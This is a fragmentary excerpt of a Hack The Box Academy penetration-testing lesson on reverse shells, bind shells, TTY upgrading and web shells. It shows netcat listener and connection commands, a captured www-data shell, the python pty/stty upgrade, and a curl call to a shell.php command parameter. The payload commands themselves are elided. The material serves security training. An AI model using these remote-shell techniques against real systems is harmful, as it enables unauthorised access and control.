...
## [Reverse Shell](https://academy.hackthebox.com/beta/module/77/section/725#reverse-shell)
...
#### [Netcat Listener](https://academy.hackthebox.com/beta/module/77/section/725#netcat-listener)

The first step is to start a `netcat` listener on a port of our choosing:

        shellsession
`PxAtte@htb[/htb]$ nc -lvnp 1234 listening on [any] 1234 ...`
...
#### [Connect Back IP](https://academy.hackthebox.com/beta/module/77/section/725#connect-back-ip)
...
However, first, we need to find our system's IP to send a reverse connection back to us. We can find our IP with the following command:
        ...
        shellsession
`PxAtte@htb[/htb]$ ip a ...SNIP... 3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500     link/none    inet 10.10.10.10/23 scope global tun0 ...SNIP...`
...
#### [Reverse Shell Command](https://academy.hackthebox.com/beta/module/77/section/725#reverse-shell-command)
...
We can utilize the exploit we have over the remote host to execute one of the above commands, i.e., through a Python exploit or a Metasploit module, to get a reverse connection. Once we do, we should receive a connection in our `netcat` listener:
        ...
        shellsession
`PxAtte@htb[/htb]$ nc -lvnp 1234 listening on [any] 1234 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572 id uid=33(www-data) gid=33(www-data) groups=33(www-data)`
...
## [Bind Shell](https://academy.hackthebox.com/beta/module/77/section/725#bind-shell)
...
#### [Bind Shell Command](https://academy.hackthebox.com/beta/module/77/section/725#bind-shell-command)
...
#### [Netcat Connection](https://academy.hackthebox.com/beta/module/77/section/725#netcat-connection)
...
We can use `netcat` to connect to that port and get a connection to the shell:
        ...
        shellsession
`PxAtte@htb[/htb]$ nc 10.10.10.1 1234 id uid=33(www-data) gid=33(www-data) groups=33(www-data)`
...
#### [Upgrading TTY](https://academy.hackthebox.com/beta/module/77/section/725#upgrading-tty)
...
There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
        ...
        shellsession
`PxAtte@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'`

After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:

        shellsession
`www-data@remotehost$ ^Z [1] Stopped                 nc -lvnp 1234 PxAtte@htb[/htb]$ stty raw -echo PxAtte@htb[/htb]$ fg [Enter] [Enter] www-data@remotehost$`
...
We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:
        ...
        shellsession
`PxAtte@htb[/htb]$ echo $TERM xterm-256color`

        shellsession
`PxAtte@htb[/htb]$ stty size 67 318`
...
## [Web Shell](https://academy.hackthebox.com/beta/module/77/section/725#web-shell)

The final type of shell we have is a `Web Shell`. A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.

#### [Writing a Web Shell](https://academy.hackthebox.com/beta/module/77/section/725#writing-a-web-shell)
...
#### [Uploading a Web Shell](https://academy.hackthebox.com/beta/module/77/section/725#uploading-a-web-shell)
...
#### [Accessing Web Shell](https://academy.hackthebox.com/beta/module/77/section/725#accessing-web-shell)
...
Another option is to use `cURL`:
        ...
        shellsession
`PxAtte@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id uid=33(www-data) gid=33(www-data) groups=33(www-data)`
